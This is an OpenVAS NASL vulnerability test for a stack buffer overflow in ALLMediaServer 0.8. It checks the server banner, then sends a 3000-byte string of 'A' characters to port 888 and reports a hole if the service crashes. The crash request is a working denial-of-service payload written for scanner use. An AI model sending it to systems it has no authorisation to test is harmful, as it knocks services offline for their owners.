##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_allmediaserver_req_handling_bof_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# ALLMediaServer Request Handling Buffer Overflow Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to execute arbitrary code in
  the context of the application. Failed attacks will cause denial of service
  conditions.
  Impact Level: System/Application";
tag_affected = "ALLMediaServer version 0.8";
tag_insight = "The flaw is due to a boundary error when processing certain network
  requests and can be exploited to cause a stack based buffer overflow via a
  specially crafted packet sent to TCP port 888.";
tag_solution = "No solution or patch is available as of 17th July, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://allmediaserver.org/";
tag_summary = "This host is running ALLMediaServer and is prone to buffer overflow
  vulnerability.";

if(description)
{
  script_id(802659);
  script_version("$Revision: 12 $");
  script_bugtraq_id(54475);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-07-17 12:12:12 +0530 (Tue, 17 Jul 2012)");
  script_name("ALLMediaServer Request Handling Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.osvdb.org/83889");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/49931");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/54475");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/19625");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/114758/allmediaserver_bof.rb.txt");

  script_description(desc);
  script_summary("Determine if ALLMediaServer Server is prone to a buffer overflow");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_require_ports("Services/www",888);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");

## Variable Initialization
soc = 0;
port = 0;
req = "";
banner = "";

## Get ALLMediaServer Port
port = get_http_port(default:888);
if(! port){
  port = 888;
}

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Open HTTP Socket
soc = http_open_socket(port);
if(!soc) {
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port: port);
if("Server: ALLPLAYER-DLNA" >!< banner)
{
  http_close_socket(soc);
  exit(0);
}

## Construct and Send attack Request
req = crap(data: "A", length: 3000);
send(socket:soc, data:req);
http_close_socket(soc);

sleep(3);

## Confirm ALLMediaServer is dead
if(http_is_dead(port:port)){
  security_hole(port);
}
